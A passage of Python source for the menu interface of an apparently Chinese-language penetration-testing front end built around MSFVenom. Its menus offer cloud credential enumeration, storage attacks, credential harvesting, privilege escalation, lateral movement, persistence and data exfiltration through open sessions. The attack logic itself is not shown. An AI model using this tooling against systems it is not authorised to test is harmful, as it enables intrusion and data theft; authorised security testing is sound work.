            protocol_map = {"1": "modbus", "2": "s7", "3": "profinet", "4": "dnp3"}
            protocol = protocol_map.get(choice, "ics")
            self.report_generator.add_scan_results(target_ip, f"ics_{protocol}", results)
            
        except Exception as e:
            print(f"执行过程中发生错误: {e}")
        
        input("\n按回车键继续...")

    def _cloud_attack_menu(self):
        
        print("\n" + "=" * 60)
        print("云环境攻击")
        print("=" * 60)
        
        print("1. AWS环境枚举")
        print("2. Azure环境枚举")
        print("3. GCP环境枚举")
        print("4. 云存储攻击")
        print("5. 返回上级")
        
        choice = input("\n请选择: ").strip()
        
        if choice == "5":
            return
        
        try:
            if choice == "1":
                access_key = input("AWS Access Key: ").strip()
                secret_key = input("AWS Secret Key: ").strip()
                region = input("区域 [us-east-1]: ").strip() or "us-east-1"
                
                if not access_key or not secret_key:
                    print("必须提供Access Key和Secret Key")
                    input("\n按回车键继续...")
                    return
                
                print("正在枚举AWS环境...")
                results = self.cloud_attacker.aws_enumeration(access_key, secret_key, region)
            
            elif choice == "2":
                tenant_id = input("Azure Tenant ID: ").strip()
                client_id = input("Client ID: ").strip()
                client_secret = input("Client Secret: ").strip()
                
                if not tenant_id or not client_id or not client_secret:
                    print("必须提供Tenant ID、Client ID和Client Secret")
                    input("\n按回车键继续...")
                    return
                
                print("正在枚举Azure环境...")
                results = self.cloud_attacker.azure_enumeration(tenant_id, client_id, client_secret)
            
            elif choice == "3":
                project_id = input("GCP Project ID: ").strip()
                service_account_key = input("Service Account Key文件路径: ").strip()
                
                if not project_id or not service_account_key:
                    print("必须提供Project ID和Service Account Key")
                    input("\n按回车键继续...")
                    return
                
                print("正在枚举GCP环境...")
                results = self.cloud_attacker.gcp_enumeration(project_id, service_account_key)
            
            elif choice == "4":
                print("\n云提供商:")
                print("1. AWS S3")
                print("2. Azure Blob")
                print("3. Google Cloud Storage")
                print("4. 返回")
                
                provider_choice = input("请选择: ").strip()
                providers = {"1": "aws", "2": "azure", "3": "gcp"}
                
                if provider_choice == "4":
                    return
                    
                if provider_choice not in providers:
                    print("无效选择")
                    input("\n按回车键继续...")
                    return
                
                provider = providers[provider_choice]
                bucket_name = input("存储桶名称: ").strip()
                
                if not bucket_name:
                    print("必须指定存储桶名称")
                    input("\n按回车键继续...")
                    return
                
                access_key = input("Access Key (可选): ").strip()
                secret_key = input("Secret Key (可选): ").strip()
                
                print("正在攻击云存储...")
                results = self.cloud_attacker.cloud_storage_attack(provider, bucket_name, access_key, secret_key)
            
            else:
                print("无效选择")
                input("\n按回车键继续...")
                return
            
            print("\n攻击结果:")
            for module, result in results.items():
                if "error" in result:
                    print(f"✗ 错误: {result['error']}")
                else:
                    status = "✓ 成功" if result['success'] else "✗ 失败"
                    print(f"{module}: {status}")
                    if result['output']:
                        print(f"  输出: {result['output'][:200]}...")
            
            cloud_type_map = {"1": "aws", "2": "azure", "3": "gcp", "4": "cloud_storage"}
            cloud_type = cloud_type_map.get(choice, "cloud")
            self.report_generator.add_scan_results(f"cloud_{cloud_type}", f"cloud_attack", results)
            
        except Exception as e:
            print(f"执行过程中发生错误: {e}")
        
        input("\n按回车键继续...")

    def _post_exploitation_menu(self):
        
        print("\n" + "=" * 60)
        print("后渗透利用")
        print("=" * 60)
        
        sessions = self.session_mgr.list_sessions()
        if not sessions:
            print("未找到活动会话，请先建立会话")
            input("\n按回车键继续...")
            return
        
        print("当前活动会话:")
        for session in sessions:
            print(f"会话 {session['id']}: {session['type']} - {session['platform']}")
        
        session_id = input("\n选择会话ID: ").strip()
        if not session_id:
            print("必须指定会话ID")
            input("\n按回车键继续...")
            return
        
        print("\n后渗透选项:")
        print("1. 收集系统信息")
        print("2. 凭据收集")
        print("3. 权限提升")
        print("4. 横向移动")
        print("5. 持久化")
        print("6. 网络发现")
        print("7. 数据渗出")
        print("8. 返回上级")
        
        choice = input("请选择: ").strip()
        
        if choice == "8":
            return
        
        try:
            if choice == "1":
                print("正在收集系统信息...")
                results = self.post_exploit.gather_system_info(session_id)
            
            elif choice == "2":
                print("正在收集凭据...")
                results = self.post_exploit.credential_harvesting(session_id)
            
            elif choice == "3":
                print("正在尝试权限提升...")
                results = self.post_exploit.privilege_escalation(session_id)
            
            elif choice == "4":
                target_hosts = input("目标主机 (逗号分隔): ").strip()
                if not target_hosts:
                    print("必须指定目标主机")
                    input("\n按回车键继续...")
                    return
                    
                print("正在尝试横向移动...")
                results = self.post_exploit.lateral_movement(session_id, target_hosts)
            
            elif choice == "5":
                print("正在设置持久化...")
                results = self.post_exploit.persistence(session_id)
            
            elif choice == "6":
                print("正在执行网络发现...")
                results = self.post_exploit.network_discovery(session_id)
            
            elif choice == "7":
                files_input = input("要渗出的文件路径 (逗号分隔，可选): ").strip()
                files_to_exfiltrate = [f.strip() for f in files_input.split(",")] if files_input else None
                print("正在执行数据渗出...")
                results = self.post_exploit.data_exfiltration(session_id, files_to_exfiltrate)
            
            else:
                print("无效选择")
                input("\n按回车键继续...")
                return
            
            print("\n后渗透结果:")
            for module, result in results.items():
                status = "✓ 成功" if result['success'] else "✗ 失败"
                print(f"{module}: {status}")
                if result['output']:
                    print(f"  输出: {result['output'][:200]}...")
            
            self.report_generator.add_post_exploit_results(f"session_{session_id}", session_id, results)
            
        except Exception as e:
            print(f"执行过程中发生错误: {e}")
        
        input("\n按回车键继续...")

    def _session_management_menu(self):
        
        print("\n" + "=" * 60)
        print("会话管理")
        print("=" * 60)
        
        print("1. 列出会话")
        print("2. 与会话交互")
        print("3. 在会话中执行命令")
        print("4. 升级会话")
        print("5. 进程迁移")
        print("6. 获取会话信息")
        print("7. 终止会话")
        print("8. 返回上级")
        
        choice = input("\n请选择: ").strip()
        
        if choice == "8":
            return
        
        try:
            if choice == "1":
                sessions = self.session_mgr.list_sessions()
                if sessions:
                    print("\n活动会话:")
                    for session in sessions:
                        print(f"会话 {session['id']}: {session['type']} - {session['platform']} - {session['info']}")
                else:
                    print("没有活动会话")
            
            elif choice in ["2", "3", "4", "5", "6", "7"]:
                sessions = self.session_mgr.list_sessions()
                if not sessions:
                    print("没有活动会话")
                    input("\n按回车键继续...")
                    return
                
                print("\n活动会话:")
                for session in sessions:
                    print(f"会话 {session['id']}: {session['type']} - {session['platform']}")
                
                session_id = input("\n选择会话ID: ").strip()
                if not session_id:
                    print("必须指定会话ID")
                    input("\n按回车键继续...")
                    return
                
                if choice == "2":
                    print(f"正在与会话 {session_id} 交互...")
                    success, output = self.session_mgr.interact_with_session(session_id)
                
                elif choice == "3":
                    command = input("要执行的命令: ").strip()
                    if not command:
                        print("必须指定命令")
                        input("\n按回车键继续...")
                        return
                        
                    print(f"正在在会话 {session_id} 中执行命令...")
                    success, output = self.session_mgr.execute_in_session(session_id, command)
                
                elif choice == "4":
                    print(f"正在升级会话 {session_id}...")
                    success, output = self.session_mgr.upgrade_shell(session_id)
                
                elif choice == "5":
                    target_pid = input("目标进程PID (可选): ").strip()
                    print(f"正在迁移进程...")
                    success, output = self.session_mgr.migrate_process(session_id, target_pid)
                
                elif choice == "6":
                    print(f"正在获取会话 {session_id} 信息...")
                    success, output = self.session_mgr.get_session_info(session_id)
                
                elif choice == "7":
                    confirm = input(f"确认终止会话 {session_id}? (y/n): ").strip().lower()
                    if confirm == 'y':
                        success, output = self.session_mgr.kill_session(session_id)
                    else:
                        print("操作取消")
                        input("\n按回车键继续...")
                        return
                
                if success:
                    print(f"✓ {output}")
                else:
                    print(f"✗ {output}")
            
            else:
                print("无效选择")
            
        except Exception as e:
            print(f"执行过程中发生错误: {e}")
        
        input("\n按回车键继续...")

    def _target_management_menu(self):
        
        print("\n" + "=" * 60)
        print("目标管理")
        print("=" * 60)
        
        print("1. 添加目标")
        print("2. 查看目标列表")
        print("3. 更新目标信息")
        print("4. 创建目标组")
        print("5. 查看目标组")
        print("6. 保存扫描结果")
        print("7. 查看扫描结果")
        print("8. 返回上级")
        
        choice = input("\n请选择: ").strip()
        
        if choice == "8":
            return
        
        try:
            if choice == "1":
                ip = input("目标IP: ").strip()
                if not ip:
                    print("必须指定目标IP")
                    input("\n按回车键继续...")
                    return
                    
                hostname = input("主机名 (可选): ").strip()
                os = input("操作系统 (可选): ").strip()
                notes = input("备注 (可选): ").strip()
                
                success = self.target_manager.add_target(ip, hostname, os, None, None, notes)
                if success:
                    print("✓ 目标添加成功")
                else:
                    print("✗ 目标添加失败")
            
            elif choice == "2":
                status_filter = input("状态过滤 (new/scanned/exploited, 留空显示所有): ").strip()
                targets = self.target_manager.get_targets(status_filter if status_filter else None)
                
                if targets:
                    print("\n目标列表:")
                    print(f"{'ID':<4} {'IP':<15} {'主机名':<20} {'操作系统':<15} {'状态':<10}")
                    print("-" * 70)
                    for target in targets:
                        print(f"{target['id']:<4} {target['ip']:<15} {target['hostname'] or 'N/A':<20} {target['os'] or 'Unknown':<15} {target['status']:<10}")
                else:
                    print("没有目标记录")
            
            elif choice == "3":
                target_id = input("目标ID: ").strip()
                if not target_id:
                    print("必须指定目标ID")
                    input("\n按回车键继续...")
                    return
                    
                print("可更新字段: ip, hostname, os, status, notes, services, vulnerabilities")
                field = input("要更新的字段: ").strip()
                value = input("新值: ").strip()
                
                if not field or not value:
                    print("必须指定字段和新值")
                    input("\n按回车键继续...")
                    return
                
                success = self.target_manager.update_target(target_id, **{field: value})
                if success:
                    print("✓ 目标更新成功")
                else:
                    print("✗ 目标更新失败")
            
            elif choice == "4":
                name = input("组名: ").strip()
                description = input("描述: ").strip()
                targets_input = input("目标ID列表 (逗号分隔): ").strip()
                
                if not name or not targets_input:
                    print("必须指定组名和目标ID列表")
                    input("\n按回车键继续...")
                    return
                    
                targets = [t.strip() for t in targets_input.split(",")]
                
                success = self.target_manager.create_target_group(name, description, targets)
                if success:
                    print("✓ 目标组创建成功")
                else:
                    print("✗ 目标组创建失败")
            
            elif choice == "5":
                groups = self.target_manager.get_target_groups()
                if groups:
                    print("\n目标组列表:")
                    for group in groups:
                        print(f"组名: {group['name']}")
                        print(f"描述: {group['description']}")
                        print(f"目标数: {len(group['targets'])}")
                        print(f"创建时间: {group['created_at']}")
                        print("-" * 40)
                else:
                    print("没有目标组")
            
            elif choice == "6":
                target_id = input("目标ID: ").strip()
                scan_type = input("扫描类型: ").strip()
                
                if not target_id or not scan_type:
                    print("必须指定目标ID和扫描类型")
                    input("\n按回车键继续...")
                    return
                
                results = {"scan_type": scan_type, "timestamp": datetime.now().isoformat()}
                success = self.target_manager.save_scan_results(target_id, scan_type, results)
                
                if success:
                    print("✓ 扫描结果保存成功")
                else:
                    print("✗ 扫描结果保存失败")
            
            elif choice == "7":
                target_id = input("目标ID (可选): ").strip()
                scan_type = input("扫描类型 (可选): ").strip()
                
                results = self.target_manager.get_scan_results(
                    target_id if target_id else None,
                    scan_type if scan_type else None
                )
                
                if results:
                    print("\n扫描结果:")
                    for result in results:
                        print(f"目标ID: {result['target_id']}, 类型: {result['scan_type']}, 时间: {result['timestamp']}")
                else:
                    print("没有扫描结果")
            
            else:
                print("无效选择")
            
        except Exception as e:
            print(f"执行过程中发生错误: {e}")
        
        input("\n按回车键继续...")

    def _scanning_tools_menu(self):
        
        print("\n" + "=" * 60)
        print("扫描工具")
        print("=" * 60)
        
        print("1. 端口扫描")
        print("2. 服务检测")
        print("3. 漏洞扫描")
        print("4. 操作系统检测")
        print("5. SMB枚举")
        print("6. SNMP枚举")
        print("7. DNS枚举")
        print("8. 返回上级")
        
        choice = input("\n请选择: ").strip()
        
        if choice == "8":
            return
        
        target = input("目标IP或域名: ").strip()
        if not target:
            print("必须指定目标")
            input("\n按回车键继续...")
            return
        
        try:
            if choice == "1":
                ports = input("端口范围 [1-1000]: ").strip() or "1-1000"
                threads = input("线程数 [10]: ").strip() or "10"
                print("正在执行端口扫描...")
                results = self.scanner.port_scan(target, ports, int(threads))
            
            elif choice == "2":
                print("正在检测服务...")
                results = self.scanner.service_detection(target)
            
            elif choice == "3":
                print("正在扫描漏洞...")
                results = self.scanner.vulnerability_scan(target)
            
            elif choice == "4":
                print("正在检测操作系统...")
                results = self.scanner.os_detection(target)
            
            elif choice == "5":
                print("正在执行SMB枚举...")
                results = self.scanner.smb_enumeration(target)
            
            elif choice == "6":
                community = input("SNMP Community字符串 [public]: ").strip() or "public"
                print("正在执行SNMP枚举...")
                results = self.scanner.snmp_enumeration(target, community)
            
            elif choice == "7":
                domain = input("目标域名: ").strip()
                if not domain:
                    print("必须指定域名")
                    input("\n按回车键继续...")
                    return
                print("正在执行DNS枚举...")
                results = self.scanner.dns_enumeration(domain)
            
            else:
                print("无效选择")
                input("\n按回车键继续...")
                return
            
            print("\n扫描结果:")
            for module, result in results.items():
                status = "✓ 成功" if result['success'] else "✗ 失败"
                print(f"{module}: {status}")
                if result['output']:
                    print(f"  输出: {result['output'][:300]}...")
            
            scan_type_map = {
                "1": "port_scan", "2": "service_detection", "3": "vulnerability_scan",
                "4": "os_detection", "5": "smb_enum", "6": "snmp_enum", "7": "dns_enum"
            }
            scan_type = scan_type_map.get(choice, "scan")
            self.report_generator.add_scan_results(target, scan_type, results)
            
        except Exception as e:
            print(f"执行过程中发生错误: {e}")
        
        input("\n按回车键继续...")

    def _report_generation_menu(self):
        
        print("\n" + "=" * 60)
        print("报告生成")
        print("=" * 60)
        
        print("1. 生成HTML报告")
        print("2. 生成JSON报告")
        print("3. 生成文本报告")
        print("4. 生成Markdown报告")
        print("5. 返回上级")
        
        choice = input("\n请选择: ").strip()
        
        if choice == "5":
            return
        
        default_filename = f"penetration_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        filename = input(f"报告文件名 [{default_filename}]: ").strip() or default_filename
        
        try:
            if choice == "1":
                output_file = f"{filename}.html"
                result_file = self.report_generator.generate_html_report(output_file)
            
            elif choice == "2":
                output_file = f"{filename}.json"
                result_file = self.report_generator.generate_json_report(output_file)
            
            elif choice == "3":
                output_file = f"{filename}.txt"
                result_file = self.report_generator.generate_text_report(output_file)
            
            elif choice == "4":
                output_file = f"{filename}.md"
                result_file = self.report_generator.generate_markdown_report(output_file)
            
            else:
                print("无效选择")
                input("\n按回车键继续...")
                return
            
            print(f"✓ 报告已生成: {result_file}")
            
        except Exception as e:
            print(f"生成报告时发生错误: {e}")
        
        input("\n按回车键继续...")

    def _full_penetration_test_menu(self):
        
        print("\n" + "=" * 60)
        print("完整渗透测试")
        print("=" * 60)
        
        target_ip = input("请输入目标IP地址: ").strip()
        if not target_ip:
            print("必须指定目标IP")
            input("\n按回车键继续...")
            return
        
        confirm = input(f"\n确认对 {target_ip} 进行完整渗透测试? (y/n): ").strip().lower()
        if confirm == 'y':
            report_file = self.run_full_penetration_test(target_ip)
            print(f"\n测试完成! 报告已保存到: {report_file}")
        else:
            print("操作取消")
        
        input("\n按回车键继续...")

def main():
    
    try:
        controller = UltimateMSFController()
        
        parser = argparse.ArgumentParser(description='终极增强版 MSFVenom 辅助生成工具')
        parser.add_argument('-i', '--interactive', action='store_true', help='交互式模式')
        parser.add_argument('-u', '--update', action='store_true', help='更新所有模块')
        parser.add_argument('-t', '--target', help='目标IP，用于完整渗透测试')
        parser.add_argument('-s', '--stats', action='store_true', help='显示统计信息')
        parser.add_argument('-v', '--version', action='store_true', help='显示版本信息')
        parser.add_argument('--clear-cache', action='store_true', help='清除缓存')
        
        args = parser.parse_args()
        
        if args.version:
            print(f"终极增强版 MSFVenom 辅助生成工具 v{controller.version}")
            print(f"作者: {controller.author}")
            print(f"GitHub: {controller.github_url}")
            return
        
        if args.clear_cache:
            controller.module_manager.clear_cache()
            print("缓存已清除")
            return
        
        if args.stats:
            controller.display_banner()
            controller.display_statistics()
            return
        
        if args.update:
            controller.update_all_modules()
            return
        
        if args.target:
            report_file = controller.run_full_penetration_test(args.target)
            print(f"渗透测试完成! 报告: {report_file}")
            return
        
        controller.interactive_mode()
        
    except KeyboardInterrupt:
        print("\n\n程序被用户中断")
    except Exception as e:
        print(f"\n程序发生错误: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
